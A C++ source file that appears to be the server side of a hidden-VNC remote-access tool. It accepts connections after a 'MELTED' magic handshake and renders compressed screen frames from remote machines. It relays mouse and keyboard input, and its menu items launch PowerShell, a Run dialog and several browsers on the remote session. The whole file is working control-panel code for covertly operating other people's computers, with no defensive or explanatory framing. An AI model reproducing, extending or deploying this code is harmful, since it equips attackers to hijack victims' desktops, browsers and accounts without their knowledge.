#include "Server.h"


typedef NTSTATUS (NTAPI *T_RtlDecompressBuffer)
(
   USHORT CompressionFormat,
   PUCHAR UncompressedBuffer,
   ULONG  UncompressedBufferSize,
   PUCHAR CompressedBuffer,
   ULONG  CompressedBufferSize,
   PULONG FinalUncompressedSize
);

static T_RtlDecompressBuffer pRtlDecompressBuffer;

enum Connection { desktop, input, end };

struct InputMessage
{
   DWORD msg;
   DWORD wParam;
   DWORD lParam;
};

struct Client
{
   SOCKET connections[Connection::end];
   DWORD  uhid;
   DWORD  sessionId;
   HWND   hWnd;
   BYTE  *pixels;
   DWORD  pixelsWidth, pixelsHeight;
   DWORD  screenWidth, screenHeight;
   HDC    hDcBmp;
   HBITMAP hBmp;
   HGDIOBJ hOldBmp;
   HANDLE minEvent;
   BOOL   fullScreen;
   RECT   windowedRect;
};

static const COLORREF gc_trans              = RGB(255, 174, 201);
static const BYTE     gc_magik[]            = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
static const DWORD    gc_maxClients         = 256;
static const DWORD    gc_sleepNotRecvPixels = 33;

static const DWORD    gc_minWindowWidth  = 800;
static const DWORD    gc_minWindowHeight = 600;


enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };

static Client           g_clients[gc_maxClients];
static DWORD            g_nextSessionId = 1;
static CRITICAL_SECTION g_critSec;

static DWORD CreateSessionId()
{
   DWORD sessionId = g_nextSessionId++;
   if(!g_nextSessionId)
      g_nextSessionId = 1;
   return sessionId;
}

static Client *GetClientByUhid(DWORD uhid)
{
   for(int i = 0; i < gc_maxClients; ++i)
   {
      if(g_clients[i].uhid == uhid)
         return &g_clients[i];
   }
   return NULL;
}

static Client *GetClientByUhidAndSession(DWORD uhid, DWORD sessionId)
{
   for(int i = 0; i < gc_maxClients; ++i)
   {
      if(g_clients[i].uhid == uhid && g_clients[i].sessionId == sessionId)
         return &g_clients[i];
   }
   return NULL;
}

static Client *GetClientByHwnd(HWND hWnd)
{
   for(int i = 0; i < gc_maxClients; ++i)
   {
      if(g_clients[i].hWnd == hWnd)
         return &g_clients[i];
   }
   return NULL;
}

static void DeleteClientBitmap(HDC hDcBmp, HBITMAP hBmp, HGDIOBJ hOldBmp)
{
   if(hDcBmp && hOldBmp)
      SelectObject(hDcBmp, hOldBmp);
   if(hBmp)
      DeleteObject(hBmp);
   if(hDcBmp)
      DeleteDC(hDcBmp);
}

static BOOL SendAll(SOCKET s, const void *buffer, int size)
{
   const char *data = (const char *) buffer;
   int sent = 0;
   while(sent != size)
   {
      int ret = send(s, data + sent, size - sent, 0);
      if(ret <= 0)
         return FALSE;
      sent += ret;
   }
   return TRUE;
}

static BOOL RecvAll(SOCKET s, void *buffer, int size)
{
   char *data = (char *) buffer;
   int received = 0;
   while(received != size)
   {
      int ret = recv(s, data + received, size - received, 0);
      if(ret <= 0)
         return FALSE;
      received += ret;
   }
   return TRUE;
}

static BOOL SendInt(SOCKET s, int i)
{
   return SendAll(s, &i, (int) sizeof(i));
}

static BOOL RecvInt(SOCKET s, int *i)
{
   return RecvAll(s, i, (int) sizeof(*i));
}

static BOOL RecvPositiveDword(SOCKET s, DWORD *value)
{
   int received;
   if(!RecvInt(s, &received) || received <= 0)
      return FALSE;
   *value = (DWORD) received;
   return TRUE;
}

static BOOL SendInputMessage(SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam)
{
   InputMessage input;
   input.msg = (DWORD) msg;
   input.wParam = (DWORD) wParam;
   input.lParam = (DWORD) lParam;
   return SendAll(s, &input, (int) sizeof(input));
}

static void SendClientInput(Client *client, UINT msg, WPARAM wParam, LPARAM lParam)
{
   EnterCriticalSection(&g_critSec);
   if(!SendInputMessage(client->connections[Connection::input], msg, wParam, lParam))
      PostQuitMessage(0);
   LeaveCriticalSection(&g_critSec);
}

static void ToggleFullscreen(HWND hWnd, Client *client)
{
   if(!client->fullScreen)
   {
      RECT rect;
      GetWindowRect(hWnd, &rect);
      client->windowedRect = rect;
      GetWindowRect(GetDesktopWindow(), &rect);
      SetWindowLong(hWnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
      SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, rect.right, rect.bottom, SWP_SHOWWINDOW);
   }
   else
   {
      SetWindowLong(hWnd, GWL_STYLE, WS_OVERLAPPEDWINDOW | WS_VISIBLE);
      SetWindowPos(hWnd,
         HWND_NOTOPMOST,
         client->windowedRect.left,
         client->windowedRect.top,
         client->windowedRect.left - client->windowedRect.right,
         client->windowedRect.bottom - client->windowedRect.top,
         SWP_SHOWWINDOW);
   }
   client->fullScreen = !client->fullScreen;
}

static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
   Client *client = GetClientByHwnd(hWnd);

   switch(msg)
   {
      case WM_CREATE:
      {
         HMENU hSysMenu = GetSystemMenu(hWnd, false);
         AppendMenu(hSysMenu, MF_SEPARATOR, 0, NULL);

         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::fullScreen,     TEXT("&Fullscreen"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startExplorer,  TEXT("Start Explorer"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startRun,       TEXT("&Run..."));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startPowershell, TEXT("Start Powershell"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startChrome,    TEXT("Start Chrome"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startBrave, TEXT("Start Brave"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startEdge,    TEXT("Start Edge"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startFirefox,   TEXT("Start Firefox"));
         AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startIexplore,  TEXT("Start Internet Explorer"));
         break;
      }
      case WM_SYSCOMMAND:
      {
/*
         if(wParam == SysMenuIds::fullScreen || (wParam == SC_KEYMENU && toupper(lParam) == 'F'))
         {
            ToggleFullscreen(hWnd, client);
            break;
         }
*/
         switch(wParam)
         {
            case SC_RESTORE:
               SetEvent(client->minEvent);
               return DefWindowProc(hWnd, msg, wParam, lParam);
            case SysMenuIds::startExplorer:
            case SysMenuIds::startRun:
            case SysMenuIds::startPowershell:
            case SysMenuIds::startChrome:
            case SysMenuIds::startBrave:
            case SysMenuIds::startEdge:
            case SysMenuIds::startFirefox:
            case SysMenuIds::startIexplore:
               SendClientInput(client, (UINT) wParam, NULL, NULL);
               break;
            default:
               return DefWindowProc(hWnd, msg, wParam, lParam);
         }
         break;
      }
      case WM_PAINT:
      {
         PAINTSTRUCT ps;
         HDC         hDc = BeginPaint(hWnd, &ps);

         RECT clientRect;
         GetClientRect(hWnd, &clientRect);

         RECT rect;
         HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
         rect.left = 0;
         rect.top = 0;
         rect.right = clientRect.right;
         rect.bottom = clientRect.bottom;

         rect.left = client->pixelsWidth;
         FillRect(hDc, &rect, hBrush);
         rect.left = 0;
         rect.top = client->pixelsHeight;
         FillRect(hDc, &rect, hBrush);
         DeleteObject(hBrush);

         BitBlt(hDc, 0, 0, client->pixelsWidth, client->pixelsHeight, client->hDcBmp, 0, 0, SRCCOPY);
         EndPaint(hWnd, &ps);
         break;
      }
      case WM_DESTROY:
      {
         PostQuitMessage(0);
         break;
      }
      case WM_ERASEBKGND:
         return TRUE;
      case WM_LBUTTONDOWN:
      case WM_LBUTTONUP:
      case WM_RBUTTONDOWN:
      case WM_RBUTTONUP:
      case WM_MBUTTONDOWN:
      case WM_MBUTTONUP:
      case WM_LBUTTONDBLCLK:
      case WM_RBUTTONDBLCLK:
      case WM_MBUTTONDBLCLK:
      case WM_MOUSEMOVE:
      case WM_MOUSEWHEEL:
      {
         if(msg == WM_MOUSEMOVE && GetKeyState(VK_LBUTTON) >= 0)
            break;

         int x = GET_X_LPARAM(lParam);
         int y = GET_Y_LPARAM(lParam);

         float ratioX = (float) client->screenWidth / client->pixelsWidth;
         float ratioY = (float) client->screenHeight / client->pixelsHeight;

         x = (int) (x * ratioX);
         y = (int) (y * ratioY);
         lParam = MAKELPARAM(x, y);
         SendClientInput(client, msg, wParam, lParam);
         break;
      }
      case WM_CHAR:
      {
         if(iscntrl(wParam))
            break;
         SendClientInput(client, msg, wParam, 0);
         break;
      }
      case WM_KEYDOWN:
      case WM_KEYUP:
      {
         switch(wParam)
         {
            case VK_UP:
            case VK_DOWN:
            case VK_RIGHT:
            case VK_LEFT:
            case VK_HOME:
            case VK_END:
            case VK_PRIOR:
            case VK_NEXT:
            case VK_INSERT:
            case VK_RETURN:
            case VK_DELETE:
            case VK_BACK:
               break;
            default:
               return 0;
         }
         SendClientInput(client, msg, wParam, 0);
         break;
      }
      case WM_GETMINMAXINFO:
      {
         MINMAXINFO* mmi = (MINMAXINFO *) lParam;
         mmi->ptMinTrackSize.x = gc_minWindowWidth;
         mmi->ptMinTrackSize.y = gc_minWindowHeight;
         if (client)
         {
         mmi->ptMaxTrackSize.x = client->screenWidth;
         mmi->ptMaxTrackSize.y = client->screenHeight;
         }
         break;
      }
      default:
         return DefWindowProc(hWnd, msg, wParam, lParam);
    }
    return 0;
}

static DWORD WINAPI ClientThread(PVOID param)
{
   Client    *client = NULL;
   SOCKET     s = (SOCKET) param;
   BYTE       buf[sizeof(gc_magik)];
   int        connection;
   DWORD      uhid;

   if(!RecvAll(s, buf, (int) sizeof(gc_magik)))
   {
      closesocket(s);
      return 0;
   }
   if(memcmp(buf, gc_magik, sizeof(gc_magik)))
   {
      closesocket(s);
      return 0;
   }
   if(!RecvInt(s, &connection))
   {
      closesocket(s);
      return 0;
   }
   {
      SOCKADDR_IN addr;
      int         addrSize;
      addrSize = sizeof(addr);
      getpeername(s, (SOCKADDR *) &addr, &addrSize);
      uhid = addr.sin_addr.S_un.S_addr;
   }
   if(connection == Connection::desktop)
   {
      DWORD sessionId;
      {
         int receivedSessionId;
         if(!RecvInt(s, &receivedSessionId) || !receivedSessionId)
         {
            closesocket(s);
            return 0;
         }
         sessionId = (DWORD) receivedSessionId;
      }

      EnterCriticalSection(&g_critSec);
      client = GetClientByUhidAndSession(uhid, sessionId);
      if(!client || client->connections[Connection::desktop])
      {
         LeaveCriticalSection(&g_critSec);
         closesocket(s);
         return 0;
      }
      client->connections[Connection::desktop] = s;
      LeaveCriticalSection(&g_critSec);

      BITMAPINFO bmpInfo;
      bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
      bmpInfo.bmiHeader.biPlanes = 1;
      bmpInfo.bmiHeader.biBitCount = 24;
      bmpInfo.bmiHeader.biCompression = BI_RGB;
      bmpInfo.bmiHeader.biClrUsed = 0;

      for(;;)
      {
         RECT rect;
         GetClientRect(client->hWnd, &rect);

         if(rect.right == 0)
         {
            BOOL x = ResetEvent(client->minEvent);
            WaitForSingleObject(client->minEvent, 5000);
            continue;
         }

         int realRight = (rect.right > client->screenWidth && client->screenWidth > 0) ? client->screenWidth : rect.right;
         int realBottom = (rect.bottom > client->screenHeight && client->screenHeight > 0) ? client->screenHeight : rect.bottom;

         if((realRight * 3) % 4)
            realRight += ((realRight * 3) % 4);

         if(!SendInt(s, realRight))
            goto exit;
         if(!SendInt(s, realBottom))
            goto exit;

         int value;
         if(!RecvInt(s, &value))
            goto exit;
         if(!value)
         {
            Sleep(gc_sleepNotRecvPixels);
            continue;
         }
         DWORD screenWidth;
         DWORD screenHeight;
         DWORD width;
         DWORD height;
         DWORD size;
         if(!RecvPositiveDword(s, &screenWidth))
            goto exit;
         if(!RecvPositiveDword(s, &screenHeight))
            goto exit;
         if(!RecvPositiveDword(s, &width))
            goto exit;
         if(!RecvPositiveDword(s, &height))
            goto exit;
         if(!RecvPositiveDword(s, &size))
            goto exit;

         if(width > (DWORD) realRight || height > (DWORD) realBottom)
            goto exit;
         if(width > MAXDWORD / 3 / height)
            goto exit;
         DWORD newPixelsSize = width * 3 * height;
         if(size > newPixelsSize)
            goto exit;

         BYTE *compressedPixels = (BYTE *) malloc(size);
         if(!compressedPixels)
            goto exit;
         if(!RecvAll(s, compressedPixels, (int) size))
         {
            free(compressedPixels);
            goto exit;
         }

         BYTE *newPixels = (BYTE *) malloc(newPixelsSize);
         if(!newPixels)
         {
            free(compressedPixels);
            goto exit;
         }

         DWORD decompressedSize = 0;
         NTSTATUS status = pRtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, newPixels, newPixelsSize, compressedPixels, size, &decompressedSize);
         free(compressedPixels);
         if(status < 0 || decompressedSize != newPixelsSize)
         {
            free(newPixels);
            goto exit;
         }

         EnterCriticalSection(&g_critSec);
         BOOL frameReady = FALSE;
         if(!client->hWnd ||
            client->uhid != uhid ||
            client->sessionId != sessionId ||
            client->connections[Connection::desktop] != s)
         {
            LeaveCriticalSection(&g_critSec);
            free(newPixels);
            return 0;
         }
         {
            BYTE   *oldPixels = NULL;
            HDC     hDc = GetDC(NULL);
            HDC     hDcBmp = NULL;
            HBITMAP hBmp = NULL;
            HGDIOBJ hOldBmp = NULL;
            HDC     oldDcBmp = NULL;
            HBITMAP oldBmp = NULL;
            HGDIOBJ oldSelectedObject = NULL;

            if(!hDc)
               goto frame_cleanup;

            if(client->pixels && client->pixelsWidth == width && client->pixelsHeight == height)
            {
               for(DWORD i = 0; i < newPixelsSize; i += 3)
               {
                  if(newPixels[i]     == GetRValue(gc_trans) &&
                     newPixels[i + 1] == GetGValue(gc_trans) &&
                     newPixels[i + 2] == GetBValue(gc_trans))
                  {
                     newPixels[i] = client->pixels[i];
                     newPixels[i + 1] = client->pixels[i + 1];
                     newPixels[i + 2] = client->pixels[i + 2];
                  }
               }
            }

            hDcBmp = CreateCompatibleDC(hDc);
            if(!hDcBmp)
               goto frame_cleanup;

            hBmp = CreateCompatibleBitmap(hDc, width, height);
            if(!hBmp)
               goto frame_cleanup;

            bmpInfo.bmiHeader.biSizeImage = newPixelsSize;
            bmpInfo.bmiHeader.biWidth = width;
            bmpInfo.bmiHeader.biHeight = height;
            if(SetDIBits(hDcBmp,
               hBmp,
               0,
               height,
               newPixels,
               &bmpInfo,
               DIB_RGB_COLORS) != (int) height)
            {
               goto frame_cleanup;
            }

            hOldBmp = SelectObject(hDcBmp, hBmp);
            if(!hOldBmp)
               goto frame_cleanup;

            oldDcBmp = client->hDcBmp;
            oldBmp = client->hBmp;
            oldSelectedObject = client->hOldBmp;
            oldPixels = client->pixels;

            client->screenWidth = screenWidth;
            client->screenHeight = screenHeight;
            client->pixels = newPixels;
            client->pixelsWidth = width;
            client->pixelsHeight = height;
            client->hDcBmp = hDcBmp;
            client->hBmp = hBmp;
            client->hOldBmp = hOldBmp;

            newPixels = NULL;
            hDcBmp = NULL;
            hBmp = NULL;
            hOldBmp = NULL;
            frameReady = TRUE;

            DeleteClientBitmap(oldDcBmp, oldBmp, oldSelectedObject);
            free(oldPixels);

            InvalidateRgn(client->hWnd, NULL, TRUE);

frame_cleanup:
            DeleteClientBitmap(hDcBmp, hBmp, hOldBmp);
            if(hDc)
               ReleaseDC(NULL, hDc);
            if(!frameReady)
               free(newPixels);
         }
         LeaveCriticalSection(&g_critSec);

         if(!frameReady)
            goto exit;

         if(!SendInt(s, 0))
            goto exit;
      }
exit:
      EnterCriticalSection(&g_critSec);
      if(client->uhid == uhid &&
         client->sessionId == sessionId &&
         client->connections[Connection::desktop] == s &&
         client->hWnd)
      {
         PostMessage(client->hWnd, WM_DESTROY, NULL, NULL);
      }
      LeaveCriticalSection(&g_critSec);
      return 0;
   }
   else if(connection == Connection::input)
   {
      char ip[16];
      DWORD sessionId;
      EnterCriticalSection(&g_critSec);
      {
         client = GetClientByUhid(uhid);
         if(client)
         {
            closesocket(s);
            LeaveCriticalSection(&g_critSec);
            return 0;
         }
         IN_ADDR addr;
         addr.S_un.S_addr = uhid;
         strcpy(ip, inet_ntoa(addr));
         wprintf(TEXT("[+] New Connection: %S\n"), ip);

         BOOL found = FALSE;
         for(int i = 0; i < gc_maxClients; ++i)
         {
            if(!g_clients[i].hWnd)
            {
               found = TRUE;
               client = &g_clients[i];
            }
         }
         if(!found)
         {
            wprintf(TEXT("[!] Client %S Disconnected: Maximum %d Clients Allowed\n"), ip, gc_maxClients);
            closesocket(s);
            LeaveCriticalSection(&g_critSec);
            return 0;
         }

         client->uhid = uhid;
         client->sessionId = CreateSessionId();
         sessionId = client->sessionId;
         client->connections[Connection::input] = s;

         client->hWnd = CW_Create(uhid, gc_minWindowWidth, gc_minWindowHeight);
         client->minEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
      }
      LeaveCriticalSection(&g_critSec);

      SendInt(s, (int) sessionId);

      MSG msg;
      while(GetMessage(&msg, NULL, 0, 0) > 0)
      {
         PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
         TranslateMessage(&msg);
         DispatchMessage(&msg);
      }

      EnterCriticalSection(&g_critSec);
      {
         wprintf(TEXT("[!] Client %S Disconnected\n"), ip);
         free(client->pixels);
         DeleteClientBitmap(client->hDcBmp, client->hBmp, client->hOldBmp);
         closesocket(client->connections[Connection::input]);
         closesocket(client->connections[Connection::desktop]);
         CloseHandle(client->minEvent);
         memset(client, 0, sizeof(*client));
      }
      LeaveCriticalSection(&g_critSec);
   }
   else
      closesocket(s);
   return 0;
}

BOOL StartServer(int port)
{
   WSADATA     wsa;
   SOCKET      serverSocket;
   sockaddr_in addr;
   HMODULE     ntdll = LoadLibrary(TEXT("ntdll.dll"));

   pRtlDecompressBuffer = (T_RtlDecompressBuffer) GetProcAddress(ntdll, "RtlDecompressBuffer");
   InitializeCriticalSection(&g_critSec);
   memset(g_clients, 0, sizeof(g_clients));
   CW_Register(WndProc);

   if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
      return FALSE;
   if((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
      return FALSE;

   addr.sin_family      = AF_INET;
   addr.sin_addr.s_addr = INADDR_ANY;
   addr.sin_port        = htons(port);

   if(bind(serverSocket, (sockaddr *) &addr, sizeof(addr)) == SOCKET_ERROR)
      return FALSE;
   if(listen(serverSocket, SOMAXCONN) == SOCKET_ERROR)
      return FALSE;

   int addrSize = sizeof(addr);
   getsockname(serverSocket, (sockaddr *) &addr, &addrSize);
   wprintf(TEXT("[+] Listening on Port: %d\n\n"), ntohs(addr.sin_port));

   for(;;)
   {
      SOCKET      s;
      sockaddr_in addr;
      int         addrSize = sizeof(addr);
      s = accept(serverSocket, (sockaddr *) &addr, &addrSize);
      if(s == INVALID_SOCKET)
         continue;
      int one = 1;
      setsockopt(s, IPPROTO_TCP, TCP_NODELAY, (const char *) &one, sizeof(one));
      HANDLE h = CreateThread(NULL, 0, ClientThread, (LPVOID) s, 0, 0);
      if(h)
         CloseHandle(h);
      else
         closesocket(s);
   }
}
